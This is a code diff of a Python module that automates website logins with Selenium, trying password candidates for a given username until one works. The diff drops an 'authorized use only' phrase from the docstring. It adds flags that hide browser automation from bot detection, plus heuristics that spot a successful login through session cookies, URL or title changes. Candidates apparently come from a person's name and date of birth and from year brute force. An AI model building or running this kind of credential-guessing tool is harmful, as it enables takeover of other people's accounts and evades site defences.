@@ -1,19 +1,20 @@
-"""Configurable website login — try PDF-style password candidates (authorized use only)."""
+"""Configurable website login — Selenium + auto success/fail detection."""
 
 from __future__ import annotations
 
 import asyncio
 import logging
 import os
-import re
 import time
 from dataclasses import dataclass
-from typing import Any
+from typing import Any, Literal
 
 from pdf_unlock import build_pdf_password_candidates, build_year_bruteforce_passwords, pdf_name_prefix
 from uidai_api import is_skip_name, normalize_dob, normalize_name
 
 log = logging.getLogger('login-try')
+
+Outcome = Literal['success', 'fail']
 
 
 @dataclass
@@ -27,6 +28,7 @@ class LoginSiteConfig:
     success_selector: str = ''
     fail_text: str = ''
     headless: bool = True
+    wait_sec: float = 8.0
 
     @classmethod
     def from_env(cls) -> LoginSiteConfig:
@@ -38,6 +40,10 @@ class LoginSiteConfig:
         if not url or not username:
             raise ValueError('Set LOGIN_SITE_URL and LOGIN_USERNAME in .env')
         headless = os.getenv('LOGIN_HEADLESS', '1').strip().lower() not in ('0', 'false', 'no')
+        try:
+            wait_sec = float(os.getenv('LOGIN_WAIT_SEC', '8') or '8')
+        except ValueError:
+            wait_sec = 8.0
         return cls(
             url=url,
             username=username,
@@ -48,6 +54,7 @@ class LoginSiteConfig:
             success_selector=os.getenv('LOGIN_SUCCESS_SELECTOR', '').strip(),
             fail_text=os.getenv('LOGIN_FAIL_TEXT', '').strip(),
             headless=headless,
+            wait_sec=max(2.0, wait_sec),
         )
 
 
@@ -105,17 +112,200 @@ class LoginTryResult:
     final_url: str = ''
 
 
-async def try_login_passwords(
+def _make_chrome_driver(headless: bool):
+    from selenium import webdriver
+    from selenium.webdriver.chrome.options import Options
+
+    opts = Options()
+    if headless:
+        opts.add_argument('--headless=new')
+    opts.add_argument('--no-sandbox')
+    opts.add_argument('--disable-dev-shm-usage')
+    opts.add_argument('--disable-gpu')
+    opts.add_argument('--window-size=1280,800')
+    opts.add_argument('--disable-blink-features=AutomationControlled')
+    opts.add_experimental_option('excludeSwitches', ['enable-automation'])
+    opts.add_experimental_option('useAutomationExtension', False)
+
+    chrome_bin = os.getenv('CHROME_BIN', '').strip()
+    if chrome_bin:
+        opts.binary_location = chrome_bin
+
+    driver = webdriver.Chrome(options=opts)
+    driver.set_page_load_timeout(45)
+    driver.implicitly_wait(0)
+    return driver
+
+
+def _by_css(selector: str):
+    from selenium.webdriver.common.by import By
+    return (By.CSS_SELECTOR, selector)
+
+
+def _visible(driver, selector: str) -> bool:
+    from selenium.webdriver.support import expected_conditions as EC
+    from selenium.webdriver.support.ui import WebDriverWait
+
+    if not selector:
+        return False
+    try:
+        WebDriverWait(driver, 0.8).until(EC.visibility_of_element_located(_by_css(selector)))
+        return True
+    except Exception:
+        return False
+
+
+def _page_text_lower(driver) -> str:
+    try:
+        return (driver.find_element('tag name', 'body').text or '').lower()
+    except Exception:
+        return (driver.page_source or '').lower()
+
+
+def _capture_baseline(driver, cfg: LoginSiteConfig) -> dict[str, Any]:
+    return {
+        'url': (driver.current_url or '').lower(),
+        'title': (driver.title or '').lower(),
+        'pass_visible': _visible(driver, cfg.pass_selector),
+        'user_visible': _visible(driver, cfg.user_selector),
+        'cookies': {c['name']: c.get('value', '') for c in driver.get_cookies()},
+    }
+
+
+def _cookies_changed(before: dict[str, str], after: dict[str, str]) -> bool:
+    auth_hints = ('session', 'auth', 'token', 'sid', 'jwt', 'logged', 'php')
+    for name, value in after.items():
+        low = name.lower()
+        if any(h in low for h in auth_hints):
+            if before.get(name) != value:
+                return True
+    if len(after) > len(before):
+        for name in after:
+            if name not in before:
+                return True
+    return False
+
+
+def _explicit_fail(driver, cfg: LoginSiteConfig) -> bool:
+    if cfg.fail_text and cfg.fail_text.lower() in _page_text_lower(driver):
+        return True
+    fail_selectors = (
+        '.alert-danger', '.error', '.invalid-feedback', '[role="alert"]',
+        '.login-error', '.text-danger',
+    )
+    for sel in fail_selectors:
+        try:
+            el = driver.find_element('css selector', sel)
+            if el.is_displayed() and (el.text or '').strip():
+                return True
+        except Exception:
+            continue
+    return False
+
+
+def _explicit_success(driver, cfg: LoginSiteConfig) -> bool:
+    url = (driver.current_url or '').lower()
+    if cfg.success_url_contains and cfg.success_url_contains.lower() in url:
+        return True
+    if cfg.success_selector and _visible(driver, cfg.success_selector):
+        return True
+    return False
+
+
+def _auto_success(driver, cfg: LoginSiteConfig, baseline: dict[str, Any]) -> bool:
+    if _explicit_fail(driver, cfg):
+        return False
+    if _explicit_success(driver, cfg):
+        return True
+
+    url = (driver.current_url or '').lower()
+    start_url = baseline.get('url', '')
+    pass_was_visible = baseline.get('pass_visible', False)
+    pass_now_visible = _visible(driver, cfg.pass_selector)
+
+    # Password box gayab + error nahi = login ho gaya
+    if pass_was_visible and not pass_now_visible:
+        return True
+
+    # URL badla aur ab login page pe nahi
+    if url and url != start_url:
+        login_hints = ('login', 'signin', 'sign-in', 'auth/login')
+        if not any(h in url for h in login_hints):
+            if not pass_now_visible:
+                return True
+
+    # Naya session cookie set hua
+    try:
+        after_cookies = {c['name']: c.get('value', '') for c in driver.get_cookies()}
+        if _cookies_changed(baseline.get('cookies', {}), after_cookies) and not pass_now_visible:
+            return True
+    except Exception:
+        pass
+
+    # Title badla (dashboard, home, welcome…)
+    title = (driver.title or '').lower()
+    start_title = baseline.get('title', '')
+    if title and title != start_title:
+        good = ('dashboard', 'home', 'welcome', 'panel', 'account', 'profile')
+        bad = ('login', 'sign in', 'error', 'invalid')
+        if any(g in title for g in good) and not any(b in title for b in bad):
+            if not pass_now_visible:
+                return True
+
+    return False
+
+
+def _wait_login_outcome(driver, cfg: LoginSiteConfig, baseline: dict[str, Any]) -> Outcome:
+    deadline = time.monotonic() + cfg.wait_sec
+    while time.monotonic() < deadline:
+        if _auto_success(driver, cfg, baseline):
+            return 'success'
+        if _explicit_fail(driver, cfg):
+            return 'fail'
+        time.sleep(0.25)
+    if _auto_success(driver, cfg, baseline):
+        return 'success'
+    return 'fail'
+
+
+def _fill_field(driver, selector: str, value: str) -> None:
+    from selenium.webdriver.common.keys import Keys
+    from selenium.webdriver.support import expected_conditions as EC
+    from selenium.webdriver.support.ui import WebDriverWait
+
+    el = WebDriverWait(driver, 12).until(EC.element_to_be_clickable(_by_css(selector)))
+    el.click()
+    el.send_keys(Keys.CONTROL, 'a')
+    el.send_keys(Keys.DELETE)
+    el.clear()
+    el.send_keys(value)
+
+
+def _submit_login(driver, cfg: LoginSiteConfig) -> None:
+    from selenium.webdriver.common.keys import Keys
+
+    if cfg.submit_selector and _visible(driver, cfg.submit_selector):
+        driver.find_element('css selector', cfg.submit_selector).click()
+    else:
+        driver.find_element('css selector', cfg.pass_selector).send_keys(Keys.RETURN)
+
+
+def _reload_login_page(driver, cfg: LoginSiteConfig) -> None:
+    driver.get(cfg.url)
+    time.sleep(0.5)
+    from selenium.webdriver.support import expected_conditions as EC
+    from selenium.webdriver.support.ui import WebDriverWait
+    WebDriverWait(driver, 15).until(EC.presence_of_element_located(_by_css(cfg.pass_selector)))
+
+
+def _try_login_passwords_sync(
     cfg: LoginSiteConfig,
     passwords: list[str],
     *,
-    delay_sec: float = 0.6,
+    delay_sec: float = 0.5,
     max_tries: int | None = None,
     on_progress: Any | None = None,
 ) -> LoginTryResult:
-    """Playwright — fill username + each password until success or list ends."""
-    from playwright.async_api import async_playwright
-
     pwd_list = [p for p in passwords if p]
     if max_tries is not None:
         pwd_list = pwd_list[:max_tries]
@@ -124,93 +314,83 @@ async def try_login_passwords(
 
     t0 = time.monotonic()
     tried = 0
+    driver = _make_chrome_driver(cfg.headless)
 
-    async def progress(msg: str) -> None:
+    def progress(msg: str) -> None:
         if on_progress:
             try:
-                r = on_progress(msg)
-                if asyncio.iscoroutine(r):
-                    await r
+                on_progress(msg)
             except Exception:
                 pass
 
-    async with async_playwright() as pw:
-        browser = await pw.chromium.launch(
-            headless=cfg.headless,
-            args=['--no-sandbox', '--disable-dev-shm-usage'],
-        )
-        context = await browser.new_context(viewport={'width': 1280, 'height': 800})
-        page = await context.new_page()
-        try:
-            await page.goto(cfg.url, wait_until='commit', timeout=45_000)
-            await asyncio.sleep(0.5)
+    try:
+        _reload_login_page(driver, cfg)
 
-            for pwd in pwd_list:
-                tried += 1
-                await progress(f'Try {tried}/{len(pwd_list)}: {pwd[:2]}***')
+        for pwd in pwd_list:
+            tried += 1
+            progress(f'Try {tried}/{len(pwd_list)}: {pwd[:2]}***')
 
+            baseline = _capture_baseline(driver, cfg)
+            try:
+                _fill_field(driver, cfg.user_selector, cfg.username)
+                _fill_field(driver, cfg.pass_selector, pwd)
+                _submit_login(driver, cfg)
+            except Exception as exc:
+                log.warning('fill/submit fail: %s', exc)
                 try:
-                    await page.fill(cfg.user_selector, cfg.username)
-                    await page.fill(cfg.pass_selector, pwd)
-                    if cfg.submit_selector:
-                        await page.click(cfg.submit_selector)
-                    else:
-                        await page.keyboard.press('Enter')
-                    await asyncio.sleep(1.0)
-                except Exception as exc:
-                    log.warning('fill/submit fail: %s', exc)
-                    await asyncio.sleep(delay_sec)
-                    continue
-
-                if await _login_succeeded(page, cfg):
-                    elapsed = time.monotonic() - t0
-                    return LoginTryResult(
-                        ok=True,
-                        password=pwd,
-                        tried=tried,
-                        elapsed_sec=elapsed,
-                        message='Login OK',
-                        final_url=page.url or '',
-                    )
-
-                if cfg.fail_text and cfg.fail_text.lower() in (await page.content()).lower():
-                    pass  # expected fail, continue
-
-                try:
-                    await page.goto(cfg.url, wait_until='commit', timeout=30_000)
-                    await asyncio.sleep(0.4)
+                    _reload_login_page(driver, cfg)
                 except Exception:
                     pass
-                await asyncio.sleep(delay_sec)
+                time.sleep(delay_sec)
+                continue
 
-            elapsed = time.monotonic() - t0
-            return LoginTryResult(
-                ok=False,
-                tried=tried,
-                elapsed_sec=elapsed,
-                message=f'No match in {tried} tries',
-                final_url=page.url or '',
-            )
-        finally:
-            await context.close()
-            await browser.close()
+            outcome = _wait_login_outcome(driver, cfg, baseline)
+            if outcome == 'success':
+                elapsed = time.monotonic() - t0
+                return LoginTryResult(
+                    ok=True,
+                    password=pwd,
+                    tried=tried,
+                    elapsed_sec=elapsed,
+                    message='Login OK (Selenium auto-detect)',
+                    final_url=driver.current_url or '',
+                )
 
+            try:
+                _reload_login_page(driver, cfg)
+            except Exception:
+                pass
+            time.sleep(delay_sec)
 
-async def _login_succeeded(page, cfg: LoginSiteConfig) -> bool:
-    url = (page.url or '').lower()
-    if cfg.success_url_contains and cfg.success_url_contains.lower() in url:
-        return True
-    if cfg.success_selector:
+        elapsed = time.monotonic() - t0
+        return LoginTryResult(
+            ok=False,
+            tried=tried,
+            elapsed_sec=elapsed,
+            message=f'No match in {tried} tries',
+            final_url=driver.current_url or '',
+        )
+    finally:
         try:
-            if await page.locator(cfg.success_selector).count() > 0:
-                return True
+            driver.quit()
         except Exception:
             pass
-    # Heuristic: left login page (no password field visible)
-    if cfg.url.lower() not in url and 'login' not in url and 'signin' not in url:
-        try:
-            if await page.locator(cfg.pass_selector).count() == 0:
-                return True
-        except Exception:
-            return True
-    return False
+
+
+async def try_login_passwords(
+    cfg: LoginSiteConfig,
+    passwords: list[str],
+    *,
+    delay_sec: float = 0.5,
+    max_tries: int | None = None,
+    on_progress: Any | None = None,
+) -> LoginTryResult:
+    """Selenium — fill username + password; auto-detect login success."""
+    return await asyncio.to_thread(
+        _try_login_passwords_sync,
+        cfg,
+        passwords,
+        delay_sec=delay_sec,
+        max_tries=max_tries,
+        on_progress=on_progress,
+    )
